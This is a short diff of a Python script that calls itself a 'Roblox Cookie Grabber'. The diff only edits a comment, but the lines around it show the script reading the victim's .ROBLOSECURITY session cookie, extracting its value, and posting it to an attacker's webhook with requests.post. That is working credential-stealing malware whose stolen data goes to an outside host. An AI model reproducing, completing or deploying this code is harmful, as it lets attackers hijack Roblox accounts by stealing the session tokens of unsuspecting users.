@@ -27,7 +27,7 @@ def GrabCookie():
 try:
     # This will try to return the value of the subkey ".robloxsecurity"
     roblox_cookie_value = str(GrabCookie())
-    # try to get the value of .robloxsecurity
+    # try to get the exact cookie
     roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
     # post cookie to your webhook
     requests.post(webhook, json={"username":"Roblox Cookie Grabber","content":f"```{roblox_cookie}```"})
